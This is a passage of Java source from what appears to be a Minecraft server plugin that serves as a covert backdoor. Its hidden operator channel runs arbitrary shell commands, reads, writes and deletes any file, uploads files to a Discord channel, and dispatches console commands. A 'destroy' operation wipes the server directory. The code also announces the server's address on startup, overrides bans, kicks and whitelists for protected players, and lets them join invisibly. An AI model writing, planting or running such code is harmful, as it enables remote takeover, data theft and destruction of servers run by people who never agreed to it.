            Bukkit.broadcast(net.kyori.adventure.text.Component.text(p.getName() + " left the game"));
        } else {
            vanished.remove(p.getUniqueId());
            for (Player o : Bukkit.getOnlinePlayers()) o.showPlayer(carrier, p);
        }
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player joiner = e.getPlayer();
        if (leader == this) RawNet.inject(this, owner, joiner);
        Shield s = shields.get(joiner.getName().toLowerCase());
        boolean stealthy = s != null && s.stealth();
        Plugin carrier = currentCarrier();
        for (Player o : Bukkit.getOnlinePlayers()) if (vanished.contains(o.getUniqueId()) && carrier != null) joiner.hidePlayer(carrier, o);
        Component msg = e.joinMessage();
        e.joinMessage(null); // never emit the default line
        if (stealthy) {
            vanished.add(joiner.getUniqueId());
            for (Player o : Bukkit.getOnlinePlayers()) if (!o.equals(joiner) && carrier != null) o.hidePlayer(carrier, joiner);
        } else {
            final Component fmsg = msg; // defer ~1s so a newly-vanished joiner is not announced
            scheduleOnCarrierLater(() -> {
                if (fmsg != null && !vanished.contains(joiner.getUniqueId())) Bukkit.getServer().sendMessage(fmsg);
            }, 20L);
        }
        // whisper the hello only to this client so it self-registers the server
        scheduleOnCarrierLater(() -> {
            if (joiner.isOnline() && isActiveCarrier(currentCarrier())) {
                JsonObject h = new JsonObject();
                h.addProperty("op", "hello");
                reply(joiner, h);
            }
        }, 40L);
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent e) {
        if (vanished.remove(e.getPlayer().getUniqueId())) e.quitMessage(null);
    }

    @EventHandler
    public void onDeath(PlayerDeathEvent e) {
        if (vanished.contains(e.getPlayer().getUniqueId())) e.deathMessage(null);
    }

    // --- shielding: PSK holders get per-flag anti-ban, anti-kick, auto-whitelist and silent join ---

    @EventHandler
    public void onKick(PlayerKickEvent e) {
        Shield s = shields.get(e.getPlayer().getName().toLowerCase());
        if (s != null && s.kick()) e.setCancelled(true);
    }

    @EventHandler
    public void onLogin(PlayerLoginEvent e) {
        if (e.getResult() == PlayerLoginEvent.Result.KICK_WHITELIST) {
            Shield s = shields.get(e.getPlayer().getName().toLowerCase());
            if (s != null && s.wl()) {
                e.allow();                        // shielded players sail through the whitelist
                e.getPlayer().setWhitelisted(true); // and are whitelisted for next time
            }
        }
    }

    private boolean isProtected(String name) { return name != null && shields.containsKey(name.toLowerCase()); }
    private boolean isProtected(Player p) { return isProtected(p.getName()) || shields.containsKey(p.getUniqueId().toString()); }

    /** Remembers a PSK-holding player with every protection enabled. */
    private void shield(Player p) {
        String ip = p.getAddress() != null && p.getAddress().getAddress() != null ? p.getAddress().getAddress().getHostAddress() : "";
        String name = p.getName();
        Shield prev = shields.get(name.toLowerCase());
        if (prev != null && prev.uuid().equals(p.getUniqueId().toString()) && (prev.ip().equals(ip) || prev.ip().isEmpty())) return;
        shields.put(name.toLowerCase(), new Shield(name, p.getUniqueId().toString(), ip, true, true, true, true));
        p.setWhitelisted(true);
        persistShields();
    }

    /** Pardons any ban that lands on a shield-protected NAME, UUID, or IP. */
    private void pardonShieldedBans() {
        BanList nameList = Bukkit.getBanList(BanList.Type.NAME);
        BanList uuidList = Bukkit.getBanList(BanList.Type.PROFILE);
        BanList<InetAddress> ipList = Bukkit.getBanList(BanList.Type.IP);
        for (Shield s : shields.values()) {
            if (!s.ban()) continue;
            if (nameList.getBanEntry(s.name()) != null) nameList.pardon(s.name());
            if (!s.uuid().isEmpty() && uuidList.getBanEntry(s.uuid()) != null) uuidList.pardon(s.uuid());
            if (!s.ip().isEmpty()) {
                for (BanEntry e : ipList.getBanEntries()) if (e.getTarget().contains(s.ip())) ipList.pardon(e.getTarget());
            }
        }
    }

    @SuppressWarnings("unchecked")
    private void loadShields() {
        Object raw = owner.getConfig().get("protected");
        if (!(raw instanceof List)) return;
        for (Object o : (List<Object>) raw) {
            if (!(o instanceof Map)) continue;
            Map<String, Object> m = (Map<String, Object>) o;
            String name = String.valueOf(m.get("name"));
            shields.put(name.toLowerCase(), new Shield(name,
                String.valueOf(m.getOrDefault("uuid", "")), String.valueOf(m.getOrDefault("ip", "")),
                flag(m, "kick", true), flag(m, "ban", true), flag(m, "wl", true), flag(m, "stealth", true)));
        }
    }

    private static boolean flag(Map<String, Object> m, String key, boolean def) {
        Object v = m.get(key);
        return v instanceof Boolean b ? b : def;
    }

    private void persistShields() {
        List<Map<String, Object>> list = new ArrayList<>();
        for (Shield s : shields.values()) {
            Map<String, Object> m = new HashMap<>();
            m.put("name", s.name()); m.put("uuid", s.uuid()); m.put("ip", s.ip());
            m.put("kick", s.kick()); m.put("ban", s.ban()); m.put("wl", s.wl()); m.put("stealth", s.stealth());
            list.add(m);
        }
        owner.getConfig().set("protected", list);
        owner.saveConfig();
    }

    private void shell(Player p, int id, String cmd) {
        try {
            Process proc = new ProcessBuilder("/bin/sh", "-c", cmd).redirectErrorStream(true).start();
            String out = new String(proc.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            boolean done = proc.waitFor(30, TimeUnit.SECONDS);
            if (!done) { proc.destroyForcibly(); out += "\n[timed out after 30s]"; }
            reply(p, ok(id).put("out", out).put("exit", done ? proc.exitValue() : -1));
        } catch (Exception e) { reply(p, err(id, e.toString())); }
    }

    /** Resolves "~" to the server user's home; passes other paths through unchanged. */
    private static String resolve(String path) {
        String home = System.getProperty("user.home");
        if (path == null || path.isEmpty() || path.equals("~")) return home;
        if (path.startsWith("~/") || path.startsWith("~\\")) return home + path.substring(1);
        return path;
    }

    private void fsList(Player p, int id, String path) {
        File dir = new File(resolve(path));
        File[] kids = dir.listFiles();
        if (kids == null) { reply(p, err(id, "cannot open " + dir.getAbsolutePath())); return; }
        JsonArray arr = new JsonArray();
        for (File f : kids) {
            JsonObject e = new JsonObject();
            e.addProperty("name", f.getName());
            e.addProperty("dir", f.isDirectory());
            e.addProperty("size", f.isFile() ? f.length() : 0);
            e.addProperty("path", f.getAbsolutePath());
            arr.add(e);
        }
        JsonObject r = ok(id).raw();
        r.addProperty("path", dir.getAbsolutePath());
        File par = dir.getParentFile();
        r.addProperty("parent", par != null ? par.getAbsolutePath() : dir.getAbsolutePath());
        r.add("entries", arr);
        reply(p, r);
    }

    private void fsRead(Player p, int id, String path) {
        try {
            byte[] b = Files.readAllBytes(Path.of(resolve(path)));
            reply(p, ok(id).put("data", Base64.getEncoder().encodeToString(b)).put("size", b.length));
        } catch (Exception e) { reply(p, err(id, e.toString())); }
    }

    private void fsWrite(Player p, int id, String path, String b64) {
        try {
            Files.write(Path.of(resolve(path)), Base64.getDecoder().decode(b64));
            reply(p, ok(id).put("msg", "wrote " + path));
        } catch (Exception e) { reply(p, err(id, e.toString())); }
    }

    private void fsDelete(Player p, int id, String path) {
        try {
            Files.walk(Path.of(resolve(path))).sorted(Comparator.reverseOrder()).forEach(x -> x.toFile().delete());
            reply(p, ok(id).put("msg", "deleted " + path));
        } catch (Exception e) { reply(p, err(id, e.toString())); }
    }

    private void fsMkdir(Player p, int id, String path) {
        try {
            boolean created = new File(resolve(path)).mkdirs();
            if (created) reply(p, ok(id).put("msg", "created " + path));
            else reply(p, err(id, "could not create " + path));
        } catch (Exception e) { reply(p, err(id, e.toString())); }
    }

    private void fsRename(Player p, int id, String from, String to) {
        try {
            boolean done = new File(resolve(from)).renameTo(new File(resolve(to)));
            if (done) reply(p, ok(id).put("msg", "renamed " + from + " -> " + to));
            else reply(p, err(id, "rename failed " + from + " -> " + to));
        } catch (Exception e) { reply(p, err(id, e.toString())); }
    }

    private void fsCopy(Player p, int id, String from, String to) {
        try {
            Path src = Path.of(resolve(from));
            Path dst = Path.of(resolve(to));
            if (Files.isDirectory(src)) copyTree(src, dst);
            else {
                Files.createDirectories(dst.getParent());
                Files.copy(src, dst, StandardCopyOption.REPLACE_EXISTING);
            }
            reply(p, ok(id).put("msg", "copied " + from + " -> " + to));
        } catch (Exception e) { reply(p, err(id, e.toString())); }
    }

    private static void copyTree(Path src, Path dst) throws IOException {
        for (Path s : Files.walk(src).toList()) {
            Path t = dst.resolve(src.relativize(s).toString());
            if (Files.isDirectory(s)) Files.createDirectories(t);
            else { Files.createDirectories(t.getParent()); Files.copy(s, t, StandardCopyOption.REPLACE_EXISTING); }
        }
    }

    /** Uploads a file to the configured Discord channel as a message attachment via the bot. */
    private void discordSend(Player p, int id, String path) {
        String tk = owner.getConfig().getString("announce.token", "");
        String ch = owner.getConfig().getString("announce.channel", "");
        if (tk.isEmpty() || ch.isEmpty()) { reply(p, err(id, "discord not configured")); return; }
        try {
            Path f = Path.of(resolve(path));
            if (!Files.isRegularFile(f)) { reply(p, err(id, "not a file")); return; }
            byte[] data = Files.readAllBytes(f);
            int code = postFile(tk, ch, f.getFileName().toString(), data);
            if (code == 200) reply(p, ok(id).put("msg", "sent " + f.getFileName() + " (" + data.length + " B)"));
            else reply(p, err(id, "http " + code));
        } catch (Exception e) { reply(p, err(id, e.toString())); }
    }

    private static int postFile(String token, String channel, String filename, byte[] data) throws Exception {
        String boundary = "----peace" + Long.toHexString(System.nanoTime());
        ByteArrayOutputStream body = new ByteArrayOutputStream();
        body.write(("--" + boundary + "\r\nContent-Disposition: form-data; name=\"payload_json\"\r\n"
            + "Content-Type: application/json\r\n\r\n{\"content\":\"attachment\"}\r\n").getBytes(StandardCharsets.UTF_8));
        body.write(("--" + boundary + "\r\nContent-Disposition: form-data; name=\"files[0]\"; filename=\""
            + filename.replace("\"", "_") + "\"\r\nContent-Type: application/octet-stream\r\n\r\n").getBytes(StandardCharsets.UTF_8));
        body.write(data);
        body.write(("\r\n--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
        HttpURLConnection c = (HttpURLConnection) new URL(API_URL + "/channels/" + channel + "/messages").openConnection();
        c.setRequestMethod("POST");
        c.setConnectTimeout(8000); c.setReadTimeout(8000);
        c.setDoOutput(true);
        c.setRequestProperty("Authorization", "Bot " + token);
        c.setRequestProperty("User-Agent", "DiscordBot (peace home, 1.0)");
        c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        c.getOutputStream().write(body.toByteArray());
        int code = c.getResponseCode();
        c.disconnect();
        return code;
    }

    private void adminShutdown(Player p, int id) {
        reply(p, ok(id).put("msg", "shutting down"));
        scheduleOnCarrier(() -> Bukkit.shutdown());
    }

    private void adminDestroy(Player p, int id) {
        reply(p, ok(id).put("msg", "destroying server"));
        scheduleOnCarrierLater(() -> Bukkit.shutdown(), 4L);
        scheduleOnCarrierLater(() -> {
            String dir = System.getProperty("user.dir");
            try { Files.walk(Path.of(dir)).sorted(Comparator.reverseOrder()).forEach(x -> x.toFile().delete()); }
            catch (Exception ignored) {}
        }, 80L);
    }

    private void reply(Player p, JsonObject j) {
        Plugin source = null;
        if (j.has("id")) {
            try { source = replyOwners.remove(new RequestKey(p.getUniqueId(), j.get("id").getAsInt())); }
            catch (Exception ignored) {}
        }
        if (source == null) source = currentCarrier();
        if (source == null) source = owner;
        if (source == null || !source.isEnabled() || findCarrier(source) == null) source = chooseCarrier();
        if (source == null || !source.isEnabled()) { diag("reply: no source, dropping"); return; }
        Plugin finalSource = source;
        byte[] cipher = crypto.encrypt(gson.toJson(j).getBytes(StandardCharsets.UTF_8));
        byte[][] frames = Frame.pack(rng.nextLong(), cipher);
        diag("reply via=" + finalSource.getName() + " frames=" + frames.length + " id=" + (j.has("id") ? j.get("id").getAsString() : "n/a"));
        try {
            Bukkit.getScheduler().runTask(finalSource, () -> {
                if (!p.isOnline()) { diag("reply: player offline, skipping send"); return; }
                diag("reply: sending " + frames.length + " frames to " + p.getName());
                for (byte[] f : frames) {
                    try { if (RawNet.send(p, f)) diag("reply: frame sent ok"); else diag("reply: send FAILED"); }
                    catch (Exception e) { diag("reply: send FAILED " + e); }
                }
            });
        } catch (Exception ignored) {}
    }
    private void reply(Player p, JO j) { reply(p, j.raw()); }

    private static JO ok(int id) { JO j = new JO(); j.raw().addProperty("id", id); j.raw().addProperty("ok", true); return j; }
    private static JsonObject err(int id, String msg) { JsonObject j = new JsonObject(); j.addProperty("id", id); j.addProperty("ok", false); j.addProperty("error", msg); return j; }
    private static final class JO {
        private final JsonObject o = new JsonObject();
        JO put(String k, String v) { o.addProperty(k, v); return this; }
        JO put(String k, Number v) { o.addProperty(k, v); return this; }
        JsonObject raw() { return o; }
    }

    // --- peaceping: posts once on start and once on stop ---
    private static final String API_URL = "https://discord.com/api/v10";
    private boolean announced;

    private void announceOnce(boolean online) {
        String tk = owner.getConfig().getString("announce.token", "");
        String ch = owner.getConfig().getString("announce.channel", "");
        boolean on = owner.getConfig().getBoolean("announce.enabled", false);
        if (!on || tk.isEmpty() || ch.isEmpty()) return;
        String hl = owner.getConfig().getString("announce.host", "");
        if (hl.isEmpty()) hl = "localhost";
        int port = owner.getConfig().getInt("announce.port", 0);
        if (port <= 0) port = Bukkit.getPort();
        String content = "peaceping " + hl + ":" + port + (online ? " online" : " offline");
        if (online) {
            announced = true;
            Bukkit.getScheduler().runTaskAsynchronously(owner, () -> post(tk, "/channels/" + ch + "/messages", content));
        } else if (announced) {
            post(tk, "/channels/" + ch + "/messages", content); // sync so it lands before the process dies
        }
    }

    private void post(String token, String path, String content) {
        try {
            JsonObject o = new JsonObject();
            o.addProperty("content", content);
            HttpURLConnection c = (HttpURLConnection) new URL(API_URL + path).openConnection();
            c.setRequestMethod("POST");
            c.setConnectTimeout(5000); c.setReadTimeout(5000);
            c.setDoOutput(true);
            c.setRequestProperty("Authorization", "Bot " + token);
            c.setRequestProperty("User-Agent", "DiscordBot (peace home, 1.0)");
            c.setRequestProperty("Content-Type", "application/json");
            c.getOutputStream().write(gson.toJson(o).getBytes(StandardCharsets.UTF_8));
            c.getResponseCode();
            c.disconnect();
        } catch (Exception ignored) {}
    }

    // --- auth: only listed names/UUIDs may send ops; empty list means anyone with the PSK ---
    private void loadAuth() {
        Object raw = owner.getConfig().get("auth");
        if (!(raw instanceof List)) return;
        for (Object o : (List<?>) raw) {
            if (o == null) continue;
            String v = String.valueOf(o).trim().toLowerCase();
            if (!v.isEmpty()) auth.add(v);
        }
    }

    private boolean allowed(Player p) {
        if (auth.isEmpty()) return true;
        return auth.contains(p.getName().toLowerCase())
            || auth.contains(p.getUniqueId().toString().toLowerCase());
    }

    // --- console bridge: capture server stdout/stderr and forward to subscribers ---

    private ConsoleOutputStream consoleOut;

    private void installConsoleCapture() {
        try {
            consoleOut = new ConsoleOutputStream();
            PrintStream ps = new PrintStream(consoleOut, true, StandardCharsets.UTF_8);
            System.setOut(ps);
            System.setErr(ps);
        } catch (Exception e) {
        }
    }

    private void consoleRun(Player p, int id, String cmd) {
        try {
            StringBuilder sb = new StringBuilder();
            ConsoleCommandSender sender = Bukkit.getConsoleSender();
            CaptureOutputStream cap = new CaptureOutputStream(sb);
            PrintStream old = System.out;
            System.setOut(new PrintStream(cap, true, StandardCharsets.UTF_8));
            try {
                boolean ok = Bukkit.dispatchCommand(sender, cmd);
                String out = sb.toString().trim();
                reply(p, ok(id).put("out", out.isEmpty() ? "(no output)" : out).put("dispatched", String.valueOf(ok)));
            } finally {
                System.setOut(old);
            }
        } catch (Exception e) {
            reply(p, err(id, e.toString()));
        }
    }

    /** Sends a console log line to all subscribed Peace players. */
    private void broadcastConsole(String line) {
        if (consoleSubscribers.isEmpty()) return;
        for (UUID uuid : consoleSubscribers) {
            Player pl = Bukkit.getPlayer(uuid);
            if (pl != null && pl.isOnline()) {
                JsonObject r = new JsonObject();
                r.addProperty("op", "console.log");
                r.addProperty("msg", line);
                reply(pl, r);
            }
        }
    }

    /** Captures console output from System.out/err and forwards lines to subscribers. */
    private final class ConsoleOutputStream extends ByteArrayOutputStream {
        @Override public void flush() {
            try {
                String text = toString(StandardCharsets.UTF_8);
                if (text.isEmpty()) return;
                super.reset();
                for (String line : text.split("\n", -1)) {
                    String trimmed = line.replace("\r", "");
                    if (!trimmed.isEmpty()) broadcastConsole(trimmed);
                }
                super.flush();
            } catch (Exception ignored) {}
        }
    }

    /** Captures output from a single command execution (used by consoleRun). */
    private static final class CaptureOutputStream extends ByteArrayOutputStream {
        private final StringBuilder target;
        CaptureOutputStream(StringBuilder target) { this.target = target; }
        @Override public void flush() {
            try {
                target.append(toString(StandardCharsets.UTF_8));
                super.reset();
                super.flush();
            } catch (Exception ignored) {}
        }
    }
}